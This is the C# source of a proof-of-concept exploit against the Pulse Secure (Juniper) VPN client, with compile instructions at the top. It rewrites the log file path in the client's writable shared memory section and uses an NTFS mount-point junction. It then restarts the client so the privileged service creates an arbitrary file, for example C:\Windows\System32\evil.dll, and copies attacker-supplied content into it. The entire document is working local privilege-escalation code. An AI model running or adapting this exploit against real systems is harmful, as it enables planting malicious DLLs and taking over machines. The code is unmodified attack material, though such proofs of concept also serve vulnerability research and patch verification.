//Pulse Secure arbitrary file creation PoC
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:anycpu /r:NtApiDotNet.dll /out:poc.exe .\PulseLogPrivesc.cs

using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Security;
using System.Security.Permissions;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;
using Microsoft.Win32;
using NtApiDotNet;

namespace PulseLogPrivesc
{
    public class POC
    {
        static string[] PulseSharedSectionNames = {
            "\\BaseNamedObjects\\PulseSecure.LogService.Settings.SharedMemory.v2",
            "\\BaseNamedObjects\\Juniper.LogService.Settings.SharedMemory.v2"
        };
        static string[] PulseRunRegKeyPaths = {
            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        };
        static string[] PulseExeDefaultPaths = {
            "C:\\Program Files (x86)\\Common Files\\Pulse Secure\\JamUI\\Pulse.exe",
            "C:\\Program Files\\Common Files\\Pulse Secure\\JamUI\\Pulse.exe",
            "C:\\Program Files (x86)\\Common Files\\Juniper Networks\\JamUI\\Pulse.exe",
            "C:\\Program Files\\Common Files\\Juniper Networks\\JamUI\\Pulse.exe"
        };
        static string PulseRunArg = "-tray";
        static string PulseProcessName = "Pulse";
        static string StreamName = ":log";
        static int LogPathMaxLength = 0xFF;
        static ulong LogPathOffset = 0x130;
        static int StartDelay = 10000;
        static int StopDelay = 5000;
        
        private static void Log(string message)
        {
            System.Console.WriteLine(message);
        }
        
        private static string BytesToString(byte[] src, int offset=0)
        {
            int slen = 0;
            for (int i = offset, n = src.Length; i < n && src[i] != 0; i++, slen++);
            return Encoding.UTF8.GetString(src, offset, slen);
        }
        
        private static byte[] StringToBytes(string s)
        {
            return Encoding.UTF8.GetBytes(s);
        }

        private static bool CreateMountPoint(string path, out string redirectedPath)
        {
            redirectedPath = null;
            try
            {
                DirectoryInfo to = Directory.GetParent(path);
                string filename = Path.GetFileName(path);
                if(to == null)
                    return false;
                DirectoryInfo from = Directory.CreateDirectory(Path.GetTempPath() + System.Guid.NewGuid().ToString());
                if(from == null)
                    return false;
                Log("Creating mount point: " + from.FullName + " -> " + to.FullName);
                NtFile.CreateMountPoint("\\??\\" + from.FullName, "\\??\\" + to.FullName, null);
                redirectedPath = Path.Combine(from.FullName, filename);
                Log("Target path is now " + redirectedPath);
            } catch {
                return false;
            }
            return true;
        }
        
        private static bool DeleteMountPoint(string path)
        {
            try
            {
                DirectoryInfo to = Directory.GetParent(path);
                if(to == null)
                    return false;
                Log("Deleting mount point: " + to.FullName);
                NtFile.DeleteReparsePoint("\\??\\" + to.FullName);
                Directory.Delete(to.FullName);
            } catch {
                return false;
            }
            return true;
        }
        
        public static string GetPulseCommandLineFromRegistry(string regKey, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regKey))
                {
                    if (key != null)
                    {
                        Object o = key.GetValue(value);
                        if (o != null) {
                            string v = o as String;
                            return v.Remove(v.IndexOf(PulseRunArg)).Trim();
                        }
                    }
                }
            }
            catch {}
            return null;
        }
        
        public static string GetPulseCommandLine()
        {
            foreach (string k in PulseRunRegKeyPaths) {
                string v = GetPulseCommandLineFromRegistry(k, "PulseSecure");
                if(v != null)
                    return v;
            }
            
            Log("PulseSecure value not found in Run registry key, trying with default paths.");
            
            //try with default path
            foreach (string p in PulseExeDefaultPaths)
                if (File.Exists(p))
                    return p;
            
            return null;
        }
        
        public static bool IsPulseClientRunning()
        {
            Process[] processes = Process.GetProcessesByName(PulseProcessName);
            if (processes.Length == 0)
                return false;
            else
                return true;
        }
        
        public static bool KillPulseClient()
        {
            Process[] processes = Process.GetProcessesByName(PulseProcessName);
            foreach (Process p in processes) {
                try {
                    Log("Stopping client...");
                    p.Kill();
                } catch {
                    return false;
                }
            }
            return true;
        }
        
        public static bool ChangeLogPathInSection(string path, out string previousPath)
        {
            previousPath = null;
            
            // open and map section RW
            NtSection section = null;
            foreach (string name in PulseSharedSectionNames)
            {
                if(section != null)
                    break;
                try {
                    section = NtSection.Open(name, null, SectionAccessRights.MapRead | SectionAccessRights.MapWrite);
                } catch {}
            }
            if(section == null)
                return false;
            NtMappedSection map = null;
            try {
                map = section.MapReadWrite();
            } catch {
                return false;
            }
            if(map == null)
                return false;
            
            // read the old path and write the new one
            try {
                byte[] buf = new byte[LogPathMaxLength];
                map.ReadArray(LogPathOffset, buf, 0, LogPathMaxLength);
                previousPath = BytesToString(buf);
                buf = StringToBytes(path + '\0');
                if(buf.Length > LogPathMaxLength)
                    return false;
                map.WriteArray(LogPathOffset, buf, 0, buf.Length);
            } catch {
                return false;
            }
            return true;
        }
        
        private static bool StartProcess(string file, string args, out Process process)
        {
            process = new Process();
            try{
                Log("Starting client...");
                process.StartInfo.FileName = file;
                process.StartInfo.Arguments = args;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
                process.Start();
            } catch(Exception e) {
                Log("Error when starting process:\n" + e.ToString());
                return false;
            }
            return true;
        }
        
        public static bool exploit(string outPath, string inPath, bool interactive = false, bool useMountPoint = true, bool restartKilledClient = false)
        {
            bool res = false;
            
            // safety checks
            if(outPath.Length + StreamName.Length + 1 > LogPathMaxLength)
            {
                Log("Output path too long");
                return false;
            }
            if(File.Exists(outPath))
            {
                Console.WriteLine("Output file " + outPath + " already exists!");
                return false;
            }
            if(inPath != null && !File.Exists(inPath))
            {
                Console.WriteLine("Input file " + inPath + " does not exist!");
                return false;
            }
            bool running = IsPulseClientRunning();
            if(running) {
                Log("Pulse Client is running.");
                Console.WriteLine("The client will be restarted. Existing VPN connexions (if any) will be reset!");
            } else {
                Log("Pulse Client is not running.");
            }
            string cmdLine = GetPulseCommandLine();
            Log("Pulse command line is: " + cmdLine);
            if(cmdLine == null)
            {
                Log("Could not get Pulse command line.");
                return false;
            }
            
            if(running && interactive) {
                Console.WriteLine("Press Enter to continue, or hit Ctrl+C to abort.");
                Console.ReadLine();
            }
            
            // Setup a temporary mount point to the target file's parent directory,
            // and replace outPath with a path that uses this junction.
            // (this is to avoid redirections, e.g. System32 vs. SysWOW64)
            string originalPath = outPath;
            if(useMountPoint)
            {
                if(!CreateMountPoint(originalPath, out outPath))
                {
                    Log("Could not create mount point.");
                    return false;
                }
            }
            
            // Replace the path in the shared section.
            // PS service & other processes will have a handle and may write to it after we're done,
            // so we use an alternate data stream, this way the default stream is stays available.
            string logPath = null;
            if(!ChangeLogPathInSection(outPath + StreamName, out logPath))
            {
                Log("Could not replace the log file path in the memory section.");
                return false;
            }
            Log("Replaced log path: " + logPath + " with: " + outPath + StreamName + " in section.");
            
            // If client if already running, kill it (and optionally restart it later)
            // If client is not running (or we're not able to kill it), start a new one and kill it
            Process process = null;
            if(running)
            {
                if(KillPulseClient())
                    Thread.Sleep(StopDelay);
                else {
                    Log("Could not kill the running pulse client, starting a new one.");
                    running = false;
                }
            }
            if(!running){
                if(StartProcess(cmdLine, PulseRunArg, out process))
                {
                    try {
                        Thread.Sleep(StartDelay);
                        Log("Stopping client...");
                        process.Kill();
                        Thread.Sleep(StopDelay);
                    } catch {
                        Log("Could not stop the client we started.");
                    }
                } else {
                        Log("Could not start client with command: " + cmdLine + " " + PulseRunArg);
                }
            }
            
            // Restore the previous path in the shared section.
            string prevPath = null;
            if(ChangeLogPathInSection(logPath, out prevPath))
                Log("Restored log path: " + logPath);
            else
                Log("Could not restore log path: " + logPath);
            
            // Start the client again if an existing one was killed.
            // Optional, as some versions have a splashscreen, so this is not always desirable.
            if(running && restartKilledClient)
                StartProcess(cmdLine, PulseRunArg, out process);
            
            // Cleanup temporary mount point
            if(useMountPoint)
            {
                if(!DeleteMountPoint(outPath))
                    Log("Could not delete mount point, you may have to cleanup.");
                outPath = originalPath;
            }
            
            // Check if target file exists
            res = File.Exists(outPath);
            if(res)
                Log("Target file created!");
            
            // Copy input file
            if(res && inPath != null) {
                Log("Copying input file...");
                try
                {
                    File.Copy(inPath, outPath, true);
                    Log("File copied.");
                } catch {
                    Log("File creation succeeded, but write failed.");
                }
            }
            
            return res;
        }
        
        public static int Main(string[] args)
        {
            string outPath = "C:\\Windows\\System32\\evil.dll";
            string inPath = null;
            
            if (args.Length == 0) {
                Console.WriteLine("usage: pi.exe OUTPUT_FILE_PATH [INPUT_FILE_PATH]");
                return 0;
            } else {
                try {
                    outPath = Path.GetFullPath(args[0]);
                    Log("Attempting to create file:\t" + outPath);
                    if(args.Length > 1) {
                        inPath = Path.GetFullPath(args[1]);
                        Log("With content of file:\t\t" + inPath);
                    }
                    
                    bool res = exploit(outPath, inPath, true);
                    if(res)
                        Log("Succeeded!");
                    else
                        Log("Failed!");
                } catch (Exception ex) {
                    Console.WriteLine("Error: ");
                    Console.WriteLine(ex);
                }
            }
            return 0;
        }
        
    }
}
